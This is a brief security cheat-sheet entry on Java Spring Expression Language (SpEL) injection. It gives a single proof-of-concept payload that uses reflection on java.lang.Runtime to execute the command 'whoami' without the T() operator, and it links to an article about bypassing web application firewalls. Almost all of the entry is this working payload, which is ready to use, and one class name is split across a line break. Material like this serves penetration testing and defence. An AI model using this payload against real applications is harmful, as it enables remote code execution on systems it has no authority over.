# Java

### SpeL Injection

Code Exec Poc without `<T>`:

```java
${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("jav
a.lang.Runtime")).exec("whoami")}
```

[https://pulsesecurity.co.nz/articles/EL-Injection-WAF-Bypass](https://pulsesecurity.co.nz/articles/EL-Injection-WAF-Bypass)

